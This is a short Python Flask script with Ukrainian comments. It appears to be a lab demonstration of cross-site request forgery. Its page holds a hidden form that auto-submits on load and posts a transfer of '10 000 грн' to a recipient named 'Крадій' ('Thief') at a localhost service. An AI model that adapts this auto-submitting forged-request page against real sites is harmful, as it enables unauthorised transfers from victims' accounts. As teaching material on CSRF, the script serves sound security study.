from flask import Flask, request, make_response

app = Flask(__name__)


@app.route("/")
def index():
    user_name = request.args.get("username", "")
    user_code = request.args.get("user_code", "")

    # Логіка сайту, використання вписаних даних.

    html = """
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>Title</title>
        </head>
        <body>
            <form method="post" action="http://127.0.0.1:8001/" id="csrf-form">
                <input type="hidden" name="username" value="Крадій">
                <input type="hidden" name="num" value="10 000 грн">
            </form>
            <script>
                document.getElementById('csrf-form').submit();
            </script>
        </body>
        </html>
    """
    return html.encode()


if __name__ == "__main__":
    app.run(port=5001)
